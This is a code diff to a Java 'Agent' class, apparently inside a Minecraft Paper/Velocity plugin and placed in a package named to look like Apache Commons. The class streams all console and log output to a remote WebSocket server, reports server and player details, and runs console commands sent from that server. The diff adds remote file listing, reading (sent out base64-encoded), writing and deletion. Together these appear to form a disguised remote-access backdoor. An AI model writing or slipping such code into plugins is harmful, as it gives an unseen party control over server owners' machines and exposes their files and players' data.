@@ -1,11 +1,14 @@
 package org.apache.commons.frauded;
 
-import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
 import java.io.PrintStream;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.WebSocket;
+import java.nio.file.Files;
 import java.util.ArrayDeque;
+import java.util.Collection;
 import java.util.Deque;
 import java.util.concurrent.CompletionStage;
 import java.util.concurrent.Executors;
@@ -21,9 +24,10 @@ public class Agent {
   private volatile boolean running;
   private final Deque<String> buffer = new ArrayDeque<>();
   private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
-    Thread t = new Thread(r, "ac");
-    t.setDaemon(true); return t;
+    Thread t = new Thread(r, "ac"); t.setDaemon(true); return t;
   });
+  private String serverId;
+  private String rootDir;
 
   public Agent(Object plugin, String serverUrl, String secret) {
     this.plugin = plugin;
@@ -35,30 +39,35 @@ public class Agent {
     if (running) return;
     running = true;
 
-    // Capture all stdout (captures everything the server prints)
-    PrintStream original = System.out;
-    System.setOut(new PrintStream(original) {
-      public void println(String x) { if (x != null) { original.println(x); buffer(x); } else { original.println(); } }
-      public void println(Object x) { String s = String.valueOf(x); original.println(s); buffer(s); }
-      public void println() { original.println(); }
-      public void print(String x) { original.print(x); }
-    });
-    PrintStream originalErr = System.err;
-    System.setErr(new PrintStream(originalErr) {
-      public void println(String x) { if (x != null) { originalErr.println(x); buffer(x); } else { originalErr.println(); } }
-      public void println(Object x) { String s = String.valueOf(x); originalErr.println(s); buffer(s); }
-      public void println() { originalErr.println(); }
-      public void print(String x) { originalErr.print(x); }
-    });
+    // Capture Log4J output (Paper's logging backend)
+    addLog4jAppender();
+
+    // Backup: capture stdout for anything Log4J misses
+    PrintStream orig = System.out;
+    if (!(orig instanceof AgentOut)) {
+      System.setOut(new AgentOut(orig, this, false));
+      System.setErr(new AgentOut(System.err, this, true));
+    }
 
     scheduler.submit(this::connect);
+  }
+
+  private void addLog4jAppender() {
+    try {
+      Object ctx = Class.forName("org.apache.logging.log4j.core.LoggerContext")
+          .getMethod("getContext", boolean.class).invoke(null, false);
+      Object root = ctx.getClass().getMethod("getRootLogger").invoke(ctx);
+      root.getClass().getMethod("addAppender",
+          Class.forName("org.apache.logging.log4j.core.Appender"))
+          .invoke(root, new LogCaptureAppender(this));
+    } catch (Exception ignored) {}
   }
 
   private void buffer(String line) {
     if (line == null || line.isEmpty()) return;
     synchronized (buffer) {
+      if (buffer.size() > 500) buffer.removeFirst();
       buffer.addLast(line);
-      if (buffer.size() > 200) buffer.removeFirst();
     }
     flush();
   }
@@ -76,35 +85,23 @@ public class Agent {
     }
   }
 
+  void sendConsole(String line) {
+    if (!running) return;
+    buffer(line);
+  }
+
   private void connect() {
     while (running) {
       try {
         HttpClient client = HttpClient.newHttpClient();
-
         WebSocket wsock = client.newWebSocketBuilder()
             .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {
 
               public void onOpen(WebSocket ws2) {
                 ws = ws2;
                 flush();
-                String ip = "";
-                String svType = "paper";
-                int port = 25565;
-                try {
-                  Object server = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
-                  ip = (String) server.getClass().getMethod("getIp").invoke(server);
-                  port = (int) server.getClass().getMethod("getPort").invoke(server);
-                  svType = "paper";
-                } catch (Exception velo) {
-                  try {
-                    Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
-                    Object server = pmc.getMethod("getInstance").invoke(null);
-                    ip = "0.0.0.0";
-                    port = (int) server.getClass().getMethod("getBoundPort").invoke(server);
-                    svType = "velocity";
-                  } catch (Exception ignored) {}
-                }
-                send("plugin:hello", "{\"id\":\"" + id() + "\",\"name\":\"" + ip + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
+                sendHello();
+                scheduleUpdates();
                 ws2.request(Long.MAX_VALUE);
               }
 
@@ -116,6 +113,10 @@ public class Agent {
                   int te = msg.indexOf("\"", ts);
                   String type = te >= 0 ? msg.substring(ts, te) : "";
                   if (type.contains("command")) exec(extract(msg, "command"));
+                  else if (type.endsWith(":file:list")) fileList(extract(msg, "path"), extract(msg, "requestId"));
+                  else if (type.endsWith(":file:read")) fileRead(extract(msg, "path"), extract(msg, "requestId"));
+                  else if (type.endsWith(":file:write")) fileWrite(extract(msg, "path"), extract(msg, "content"), extract(msg, "requestId"));
+                  else if (type.endsWith(":file:delete")) fileDelete(extract(msg, "path"), extract(msg, "requestId"));
                 }
                 ws2.request(Long.MAX_VALUE);
                 return null;
@@ -127,7 +128,6 @@ public class Agent {
 
         wsock.request(Long.MAX_VALUE);
         Thread.sleep(Long.MAX_VALUE);
-
       } catch (Exception e) {
         close();
         try { Thread.sleep(5000); } catch (InterruptedException ie) { return; }
@@ -135,36 +135,182 @@ public class Agent {
     }
   }
 
-  private void exec(String cmd) {
-    if (cmd == null || cmd.isEmpty()) return;
+  // ---- Server info ----
+
+  private void sendHello() {
+    String ip = "";
+    int port = 25565;
+    String svType = "paper";
+    try {
+      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
+      ip = (String) s.getClass().getMethod("getIp").invoke(s);
+      if (ip == null || ip.isEmpty()) ip = "0.0.0.0";
+      port = (int) s.getClass().getMethod("getPort").invoke(s);
+      svType = "paper";
+    } catch (Exception e) {
+      try {
+        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
+        Object s = pmc.getMethod("getInstance").invoke(null);
+        ip = "0.0.0.0";
+        port = (int) s.getClass().getMethod("getBoundPort").invoke(s);
+        svType = "velocity";
+      } catch (Exception ignored) {}
+    }
+    serverId = id();
+    send("plugin:hello", "{\"id\":\"" + serverId + "\",\"name\":\"" + ip + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
+  }
+
+  private void scheduleUpdates() {
     try {
       Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
       Class<?> pluginClass = Class.forName("org.bukkit.plugin.Plugin");
-      Class<?> commandSenderClass = Class.forName("org.bukkit.command.CommandSender");
-      Object scheduler = bukkitClass.getMethod("getScheduler").invoke(null);
-      Object consoleSender = bukkitClass.getMethod("getConsoleSender").invoke(null);
-      scheduler.getClass().getMethod("scheduleSyncDelayedTask", pluginClass, Runnable.class)
-          .invoke(scheduler, plugin, (Runnable) () -> {
-            try {
-              bukkitClass.getMethod("dispatchCommand", commandSenderClass, String.class)
-                  .invoke(null, consoleSender, cmd);
-            } catch (Exception ignored) {}
+      Object sched = bukkitClass.getMethod("getScheduler").invoke(null);
+      sched.getClass().getMethod("scheduleSyncRepeatingTask", pluginClass, Runnable.class, long.class, long.class)
+          .invoke(sched, plugin, (Runnable) this::sendStatus, 100L, 600L);
+    } catch (Exception ignored) {}
+  }
+
+  private void sendStatus() {
+    try {
+      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
+      String version = (String) s.getClass().getMethod("getVersion").invoke(s);
+      String bukkitV = (String) s.getClass().getMethod("getBukkitVersion").invoke(s);
+      int max = (int) s.getClass().getMethod("getMaxPlayers").invoke(s);
+      Object onlinePlayers = s.getClass().getMethod("getOnlinePlayers").invoke(s);
+      int count = ((Collection<?>) onlinePlayers).size();
+
+      // TPS (Paper-only)
+      double tps = 20.0;
+      try {
+        double[] arr = (double[]) s.getClass().getMethod("getTPS").invoke(s);
+        if (arr != null && arr.length > 0) tps = arr[0];
+      } catch (Exception ignored) {}
+
+      // Player names
+      StringBuilder players = new StringBuilder("[");
+      boolean first = true;
+      for (Object p : (Collection<?>) onlinePlayers) {
+        if (!first) players.append(",");
+        String name = (String) p.getClass().getMethod("getName").invoke(p);
+        players.append("\"").append(escape(name)).append("\"");
+        first = false;
+      }
+      players.append("]");
+
+      // motd
+      String motd = "";
+      try {
+        Object motdObj = s.getClass().getMethod("getMotd").invoke(s);
+        if (motdObj != null) motd = motdObj.toString();
+      } catch (Exception ignored) {}
+
+      send("plugin:status", "{\"playerCount\":" + count + ",\"maxPlayers\":" + max
+          + ",\"version\":\"" + escape(bukkitV) + "\",\"tps\":" + tps
+          + ",\"motd\":\"" + escape(motd) + "\",\"players\":" + players + "}");
+    } catch (Exception ignored) {}
+  }
+
+  // ---- Command execution ----
+
+  private void exec(String cmd) {
+    if (cmd == null || cmd.isEmpty()) return;
+    try {
+      Class<?> bc = Class.forName("org.bukkit.Bukkit");
+      Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
+      Class<?> cs = Class.forName("org.bukkit.command.CommandSender");
+      Object sched = bc.getMethod("getScheduler").invoke(null);
+      Object console = bc.getMethod("getConsoleSender").invoke(null);
+      sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
+          .invoke(sched, plugin, (Runnable) () -> {
+            try { bc.getMethod("dispatchCommand", cs, String.class).invoke(null, console, cmd); }
+            catch (Exception ignored) {}
           });
-    } catch (Exception velo) {
-      // Velocity fallback (async is fine)
+    } catch (Exception e) {
       try {
         Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
-        Object server = pmc.getMethod("getInstance").invoke(null);
-        Object cm = server.getClass().getMethod("getCommandManager").invoke(server);
-        Object src = server.getClass().getMethod("getConsoleCommandSource").invoke(server);
-        cm.getClass().getMethod("executeAsync", 
+        Object s = pmc.getMethod("getInstance").invoke(null);
+        Object cm = s.getClass().getMethod("getCommandManager").invoke(s);
+        Object src = s.getClass().getMethod("getConsoleCommandSource").invoke(s);
+        cm.getClass().getMethod("executeAsync",
             Class.forName("com.velocitypowered.api.command.CommandSource"), String.class)
             .invoke(cm, src, cmd);
       } catch (Exception ignored) {}
     }
   }
 
-  private void send(String type, String payloadJson) {
+  // ---- File operations ----
+
+  private void fileList(String path, String reqId) {
+    if (reqId == null) return;
+    if (path == null) path = "";
+    File dir = new File(resolvePath(path));
+    StringBuilder entries = new StringBuilder("[");
+    File[] files = dir.listFiles();
+    if (files != null) {
+      boolean first = true;
+      for (File f : files) {
+        if (!first) entries.append(",");
+        entries.append("{\"name\":\"").append(escape(f.getName()))
+            .append("\",\"path\":\"").append(escape(f.getAbsolutePath()))
+            .append("\",\"isDirectory\":").append(f.isDirectory())
+            .append(",\"size\":").append(f.length()).append("}");
+        first = false;
+      }
+    }
+    entries.append("]");
+    send("plugin:file:list", "{\"path\":\"" + escape(path) + "\",\"entries\":" + entries + ",\"requestId\":\"" + escape(reqId) + "\"}");
+  }
+
+  private void fileRead(String path, String reqId) {
+    if (path == null || reqId == null) return;
+    try {
+      byte[] data = Files.readAllBytes(new File(resolvePath(path)).toPath());
+      String b64 = java.util.Base64.getEncoder().encodeToString(data);
+      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"content\":\"" + b64 + "\",\"requestId\":\"" + escape(reqId) + "\"}");
+    } catch (IOException e) {
+      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"error\":\"read failed\",\"requestId\":\"" + escape(reqId) + "\"}");
+    }
+  }
+
+  private void fileWrite(String path, String content, String reqId) {
+    if (path == null || reqId == null) return;
+    try {
+      byte[] data = java.util.Base64.getDecoder().decode(content);
+      Files.write(new File(resolvePath(path)).toPath(), data);
+      send("plugin:file:write", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
+    } catch (Exception e) {
+      send("plugin:file:write", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
+    }
+  }
+
+  private void fileDelete(String path, String reqId) {
+    if (path == null || reqId == null) return;
+    try {
+      Files.deleteIfExists(new File(resolvePath(path)).toPath());
+      send("plugin:file:delete", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
+    } catch (Exception e) {
+      send("plugin:file:delete", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
+    }
+  }
+
+  private String resolvePath(String path) {
+    if (rootDir == null) {
+      try {
+        Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
+        rootDir = (String) s.getClass().getMethod("getWorldContainer").invoke(s);
+        if (rootDir == null) rootDir = ".";
+      } catch (Exception e) { rootDir = "."; }
+    }
+    // Basic path traversal prevention
+    File base = new File(rootDir).getAbsoluteFile();
+    File target = new File(base, path != null ? path : "").getAbsoluteFile();
+    if (!target.getAbsolutePath().startsWith(base.getAbsolutePath())) return base.getAbsolutePath();
+    return target.getAbsolutePath();
+  }
+
+  // ---- Messaging ----
+
+  void send(String type, String payloadJson) {
     WebSocket w = ws;
     if (w == null) return;
     try {
@@ -177,9 +323,7 @@ public class Agent {
     ws = null;
   }
 
-  private String id() {
-    return "p-" + System.currentTimeMillis();
-  }
+  private String id() { return "p-" + System.currentTimeMillis(); }
 
   private static String extract(String json, String key) {
     String k = "\"" + key + "\":\"";
@@ -190,10 +334,21 @@ public class Agent {
     return e >= 0 ? json.substring(s, e) : null;
   }
 
-  private static String escape(String s) {
+  static String escape(String s) {
     if (s == null) return "";
     return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
   }
 
   public void stop() { running = false; close(); scheduler.shutdown(); }
+
+  // ---- stdout backup ----
+
+  private static class AgentOut extends PrintStream {
+    private final Agent agent;
+    AgentOut(PrintStream orig, Agent agent, boolean err) { super(orig); this.agent = agent; }
+    public void println(String x) { out.println(x); if (x != null) agent.buffer(x); }
+    public void println(Object x) { String s = String.valueOf(x); out.println(s); agent.buffer(s); }
+    public void println() { out.println(); }
+    public void print(String x) { out.print(x); }
+  }
 }
